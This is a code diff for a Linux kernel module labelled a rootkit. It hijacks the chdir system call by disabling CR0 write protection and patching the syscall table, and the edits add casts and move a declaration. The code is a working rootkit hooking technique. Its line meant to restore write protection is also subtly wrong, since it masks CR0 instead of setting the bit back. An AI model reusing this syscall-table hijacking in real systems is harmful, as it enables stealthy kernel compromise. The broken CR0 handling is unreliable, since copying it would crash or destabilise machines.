@@ -20,8 +20,9 @@ asmlinkage int (*original_chdir)(const char __user *path);
 
 asmlinkage int my_chdir(const char __user *path)
 {
+	int err;
 	printk("Hijacked chdir call\n");
-	int err = original_chdir(path);
+	err = original_chdir(path);
 	return err;
 }
 
@@ -68,9 +69,8 @@ int rootkit_init(void)
 	write_cr0(read_cr0() & (~0x10000));
 
 	// hijack chdir system call
-	original_chdir = syscall_table[__NR_chdir];
-	syscall_table[__NR_chdir] = my_chdir;
-
+	original_chdir = (int (*)(const char __user *)) syscall_table[__NR_chdir];
+	syscall_table[__NR_chdir] = (void *) my_chdir;
 
 	// enable write protected
 	write_cr0(read_cr0() & 0x10000);
@@ -83,7 +83,7 @@ int rootkit_init(void)
 void rootkit_exit(void)
 {
 	write_cr0(read_cr0() & (~0x10000));
-	syscall_table[__NR_chdir] = original_chdir;
+	syscall_table[__NR_chdir] = (void *) original_chdir;
 	write_cr0(read_cr0() & 0x10000);
 	printk("Rootkit unloaded\n");
 }
